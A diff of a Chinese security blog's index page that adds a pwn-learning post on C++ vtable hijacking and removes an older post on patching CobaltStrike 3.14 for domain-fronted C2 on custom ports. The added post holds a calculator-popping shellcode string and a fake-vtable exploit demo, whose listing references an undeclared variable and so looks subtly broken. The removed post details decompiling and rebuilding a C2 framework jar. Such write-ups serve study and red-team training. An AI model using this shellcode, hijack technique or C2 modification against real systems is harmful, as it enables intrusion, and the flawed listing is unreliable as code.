@@ -207,7 +207,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
                     </div>
                 </section>
                 
@@ -291,6 +291,109 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-realpwn-vtable-hijacking-exercise" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2021/07/04/realpwn-vtable-hijacking-exercise/" class="article-date">
+      <time datetime="2021-07-04T02:54:28.000Z" itemprop="datePublished">2021-07-04</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2021/07/04/realpwn-vtable-hijacking-exercise/">【RealPwn-1】 虚函数表劫持练习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。</p>
+</blockquote>
+<p>C++ 里，为了实现 “多态” ，使用了虚函数表 (vtable)。</p>
+<p>每个含有虚函数的类的对象，在内存的起始处有一个 vptr 的指针，指向虚函数表。</p>
+<p>虚函数表存了类里所有虚函数的指针。调用函数时，在这个虚函数表里查找实际要调用的函数。</p>
+<p>借用网上的一张图</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/vft.png" alt="vft.png"></p>
+<p>总结下虚函数表的特性：</p>
+<ol>
+<li><p>虚函数表在 <code>.data</code> 段，仅可读，无法修改</p>
+</li>
+<li><p>虚函数表类似一个数组，每个有虚函数的类的对象实例都存储指向虚函数表的指针。</p>
+</li>
+<li><p>虚函数表指针 vptr 一般在对象起始的 4 字节（32 位） 或 8 字节（64 位），多重继承时有可能存在多个虚函数表，</p>
+</li>
+</ol>
+<p>下面调试一下，环境 VS2019 + x32dbg：</p>
+<p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">public :</span><br><span class="line">	virtual int hijackme() &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	char msg[128];</span><br><span class="line"></span><br><span class="line">	A* a = new A;</span><br><span class="line">	long* a_addr = (long*) a;</span><br><span class="line">	long* vptr = (long*) ( *a_addr);</span><br><span class="line"></span><br><span class="line">	sprintf(msg, &quot;object a address: 0x%p&quot;, a_addr);</span><br><span class="line">	cout &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">	sprintf(msg, &quot;vtable address: 0x%p&quot;, vptr[0]);</span><br><span class="line">	cout &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163648268.png" alt="image-20210702163648268"></p>
+<p>x32dbg 里看内存</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163707394.png" alt="image-20210702163707394"></p>
+<p><code>0x014FD028</code> 是 vptr ，指向虚函数表。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163900420.png" alt="image-20210702163900420"></p>
+<p><code>0xB131EC</code> 是虚函数表，所在内存是只读的无法修改，它指向的是函数实际的地址，无法修改虚表中函数的地址。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164047943.png" alt="image-20210702164047943"></p>
+<p>对象是在堆上的，它的内存是 <code>RW</code> 可读可写的，常见的攻击思路是修改对象的虚函数表指针 vptr ，即 <code>0x014FD028</code> 中的数据。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164627019.png" alt="image-20210702164627019"></p>
+<p>试验一下。</p>
+<p>要在内存中伪造出一个虚表，将对象的虚表指针指向它。</p>
+<p>修改代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">hijackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹计算器</span></span><br><span class="line"><span class="keyword">char</span> shellcode[<span class="number">0x1000</span>] = <span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span><br><span class="line"><span class="string">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span><br><span class="line"><span class="string">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span><br><span class="line"><span class="string">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span><br><span class="line"><span class="string">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span><br><span class="line"><span class="string">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span><br><span class="line"><span class="string">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span><br><span class="line"><span class="string">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span><br><span class="line"><span class="string">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span><br><span class="line"><span class="string">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span></span><br><span class="line"><span class="string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"</span></span><br><span class="line"><span class="string">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line"><span class="string">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x00"</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">	A* a = <span class="keyword">new</span> A;</span><br><span class="line">	<span class="keyword">long</span>* a_addr = (<span class="keyword">long</span>*) a;</span><br><span class="line">	<span class="keyword">long</span>* vptr = (<span class="keyword">long</span>*) ( *a_addr );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"object a address: 0x%p"</span>, a_addr);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"vtable address: 0x%p"</span>, vptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> fake_vtable[<span class="number">4</span>]; <span class="comment">//伪造一个虚表</span></span><br><span class="line">	<span class="keyword">long</span> shellcode_addr = (<span class="keyword">long</span>)((<span class="keyword">long</span>*) (shellcode));</span><br><span class="line">	<span class="built_in">memcpy</span>(fake_vtable, &amp;shellcode_addr ,<span class="number">4</span>); <span class="comment">//虚表指向shellcode</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"fake_vtable address: 0x%p"</span>, &amp;fake_vtable);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"shellcode address: 0x%p"</span>, (<span class="keyword">long</span>*) shellcode);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> fake_vtable_addr = (<span class="keyword">long</span>) ( (<span class="keyword">long</span>*) fake_vtable );</span><br><span class="line">	<span class="built_in">memcpy</span>(tmp, &amp;fake_vtable_addr, <span class="number">4</span>); <span class="comment">// 修改对象虚表指针，指向伪造的虚表</span></span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	a-&gt;hijackme();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重新执行</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702175254591.png" alt="image-20210702175254591"></p>
+<p>在 <code>0x00DCFE44</code> 处构造一个虚表，只要一个项，指向 <code>0x00535020</code> 。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174543785.png" alt="image-20210702174543785"></p>
+<p><code>0x00535020</code> 是 shellcode</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174636492.png" alt="image-20210702174636492"></p>
+<p>这里涉及到一个问题，shellcode 是在 <code>.data</code> 段不可执行的，一般来说需要构造 ROP 链，给 shellcode 所在内存加上执行权限。这里略过这个问题，暂时先关掉 DEP（属性 —&gt; 链接器 —&gt; 高级）。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702173559882.png" alt="image-20210702173559882"></p>
+<p>应该就可以执行 shellcode 了。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/vtable-hijacking.gif" alt="vtable-hijacking"></p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://pwn4.fun/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" target="_blank" rel="noopener">C++虚函数调用攻防战</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/二进制/">二进制</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-use-inlinehook-technology-to-make-a-more-general-webshell" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -624,122 +727,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/开发/">开发</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pentest-cobaltstrike-improve" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="2020/04/10/pentest-cobaltstrike-improve/" class="article-date">
-      <time datetime="2020-04-10T07:08:53.000Z" itemprop="datePublished">2020-04-10</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2020/04/10/pentest-cobaltstrike-improve/">魔改 CobaltStrike 3.14 实现域前置自定义端口</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>国内VPS的 80,443 端口默认都是需要备案才能使用，所以如果 TeamServer 搭在国内，Listener 只能选择其他端口，一般使用是没什么问题，但如果要配置域前置，会遇到上线不了的问题。</p>
-<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>我配置了一个 8880 端口的 listener，并配置了 CloudFront （回源端口 8880），生成了指向 80 端口的后门。但运行后并没有上线，Wireshark 抓包分析一下。</p>
-<blockquote>
-<p>为了生成指向 80 端口的后门，我额外配置了一个 80 端口的 listener。</p>
-</blockquote>
-<p>可以看到，第一步确实向 cdn 请求了，也成功从 teamserver 获得了后续的 shellcode 并加载成功了(不然不会有第二步的请求)，但是第二步开始向 8880 端口拉取任务了，这里就出问题了，因为 cdn 域名的 8880 并不能到达 teamserver 的 8880。</p>
-<p>所以我们要修改第二步的请求，强制让它继续和 80 端口通信。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal1.jpg" alt="p1"></p>
-<p>那么，为什么第一步的访问的端口是对的，第二个是错的呢。</p>
-<p>我们知道一般用的CS后门是 staging 模式的，执行过程可以分为两个部分 stage 和 stager 。第一步执行的是 stager ，负责通过各种路径（http&amp;https&amp;tcp）下载 stage，然后注入到内存中执行。第二步的 stage 是真正实现后门功能的部分。</p>
-<p>因为生成 beacon 时，用的 listener 是监听 80 端口的，所以 beacon 第一次请求的确是向 80 端口发起的。</p>
-<p>但实际上 cdn 的 80 端口指向的是 8880 端口的 listener，8880 接到请求，会返回 stage，stage 时在 teamserver 生成的，它并不知道我们是在通过 80 端口访问它，此时的 stage 是指向 8880 的。这造成了后续的请求都会指向 8880。</p>
-<p>要解决问题，必须修改 teamserver 生成的 stage 指向的端口，但搜了一大圈，并没有找到相关的解决方法，AggressorScript 也只能在客户端动动刀子，想要修改 Listener 相关的得要从根源入手。</p>
-<h1 id="杀死问题的办法-——-魔改"><a href="#杀死问题的办法-——-魔改" class="headerlink" title="杀死问题的办法 —— 魔改"></a>杀死问题的办法 —— 魔改</h1><p>我的思路是在创建 listener 的时候，再加一个选项，让 stage 用的端口和 listener 实际监听的端口分开。</p>
-<blockquote>
-<p>当然做👇这些之前要先反编译，我这里用的 <code>fernflower</code> ，用法略过。</p>
-</blockquote>
-<h2 id="0x01-UI"><a href="#0x01-UI" class="headerlink" title="0x01 UI"></a>0x01 UI</h2><p>CobaltStrike 用的是 swing 写的 UI，创建 Listener 的部分在 <code>aggressor.dialogs.ListenerDialog.show()</code></p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal4.jpg" alt="p4"></p>
-<p>用了 DialogManager 包装了每个 Dialog，调用 <code>DialogManager.text</code> 可以在当前 dialog 创建输入框，命名为 <code>bind port</code>，作为实际监听的端口。</p>
-<p>来加一个输入框：</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal6.jpg" alt="p6"></p>
-<p>当 <code>Save</code> 按钮按下时，会在后续触发到 <code>ListenerDialog.dialogResult</code></p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal5.jpg" alt="p5"></p>
-<p>这里检查了一下 domain 是否超长，通过了，就推送一个 <code>listeners.create</code> 请求到 teamserver，参数是 listener 的名字和配置信息，再之后 listener 就会在 teamserver 建立。</p>
-<p>我们下一步是要把 <code>bind port</code> 传到 <code>this.options</code>，这里有点绕，在调用 <code>DialogManager.text</code> 的时候创建一个内部的 <code>DialogListener</code>。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal7.jpg" alt="p7"></p>
-<p>在 <code>DialogManager.addDilogListenerInternal</code> 可以看到会把创建的 <code>DialogListener</code> 加到</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal9.jpg" alt="p9"></p>
-<p><code>Save</code> 按钮实际是 <code>DialogManager.action_noclose</code> 生成的<br>这里的，点击事件可以在这里找到。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal10.jpg" alt="p10"></p>
-<p>这里调用了之前的创建的匿名 <code>DialogListener</code>，将值传到 <code>this.options</code>，所以创建的输入框会自动把值添加到配置里来，😭绕了一圈啥也不用干。</p>
-<p>为了能在 <code>Listeners</code> 这个 Tab 直接看到设置的 <code>bind port</code>， 给 <code>aggressor.windows.ListenerManager</code> 的 <code>cols</code> 加上 <code>bind port</code> 就会自动加载进来了。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal13.jpg" alt="p13"></p>
-<p>效果如下：</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal12.jpg" alt="p12"></p>
-<h2 id="0x02-Listener"><a href="#0x02-Listener" class="headerlink" title="0x02 Listener"></a>0x02 Listener</h2><p>在各处调用 Listener 时，会创建 <code>common.Listener</code> 实例，里面是没有 <code>bind port</code> 字段的，所以要给它加上。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal19.jpg" alt="p19"></p>
-<h2 id="0x03-Stage"><a href="#0x03-Stage" class="headerlink" title="0x03 Stage"></a>0x03 Stage</h2><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal11.jpg" alt="p11"></p>
-<p>teamserver 接到创建 Listener 的请求后，会先把 Listener 序列化保存下来，以便下次 teamserver 重启的时候可以自动监听。</p>
-<p>然后本地调用 <code>beacons.start</code> 。这里的调用链有点长:</p>
-<p>server.Beacons.call() -&gt; server.Beacons.setup() -&gt; beacon.BeaconsSetup.start() -&gt; server.WebCalls.getWebServer() -&gt; beacon.BeaconSetup.exportBeaconStage()</p>
-<p>最主要的是两个地方 <code>server.WebCalls.getWebServer()</code> 创建 Web 服务，<code>beacon.BeaconSetup.exportBeaconStage</code> 构造 Stage 的 shellcode。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal14.jpg" alt="p14"></p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal15.jpg" alt="p15"></p>
-<p>这里的 <code>var1</code> 是监听的端口号，默认的 Stage 指向的端口和 Listener 监听的端口号是同一个，现在我们要让他们的端口分离，因为 <code>start()</code> 参数不是 <code>Map</code> ，所以不能直接往里加一个参数，只能重写或者重载一下这个方法。</p>
-<p>我直接重写了一下，加了一个参数 <code>bindPort</code>，创建 Web 服务时，就用这个端口。Stage 还是用原来的 <code>var1</code> 作为端口，不用修改。这样创建 <code>Listener</code> 的时候，原来端口号代表 Stage 用的</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal16.jpg" alt="p16"></p>
-<p>相应的，上层的调用链也要修改一下。</p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal17.jpg" alt="p17"></p>
-<p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal18.jpg" alt="p18"></p>
-<h2 id="0x05-编译-amp-替换"><a href="#0x05-编译-amp-替换" class="headerlink" title="0x05 编译 &amp; 替换"></a>0x05 编译 &amp; 替换</h2><p>然后要把修改过的代码编译一下，替换到 jar 里。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">javac -cp cobaltstrike.jar common/Listener.java</span><br><span class="line">zip -u cobaltstrike.jar common/Listener.class</span><br><span class="line">javac -cp cobaltstrike.jar aggressor/dialogs/ListenerDialog.java </span><br><span class="line">zip -u cobaltstrike.jar aggressor/dialogs/ListenerDialog.class</span><br><span class="line">javac -cp cobaltstrike.jar aggressor/windows/ListenerManager.java </span><br><span class="line">zip -u cobaltstrike.jar aggressor/windows/ListenerManager.class</span><br><span class="line">javac -cp cobaltstrike.jar server/Beacons.java</span><br><span class="line">zip -u cobaltstrike.jar server/Beacons.class</span><br><span class="line">javac -cp cobaltstrike.jar beacon/BeaconSetup.java </span><br><span class="line">zip -u cobaltstrike.jar beacon/BeaconSetup.class</span><br></pre></td></tr></table></figure>
-<p>⬆️可能有点遗漏的，各位自己调一下吧。</p>
-<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/2020/04/10/pentest-cobaltstrike-improve/rrr.jpg" alt="rrr"></p>
-<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>这是一篇19年的存稿，当时还没有 <a href="https://www.cobaltstrike.com/help-http-beacon" target="_blank" rel="noopener">CS 4.0</a>，这个问题 4.0 已经解决了，可以配置 Listener 的 <code>C2 Port</code> 和 <code>Bind Port</code>，将 C2 的端口与 teamserver 实际监听的端口分开。</p>
-<p>现在放出来，也算抛砖引玉，给想要修改 CS 的小伙计提供点经验，欢迎交流～</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Pentest/">Pentest</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
     </div>
 
       
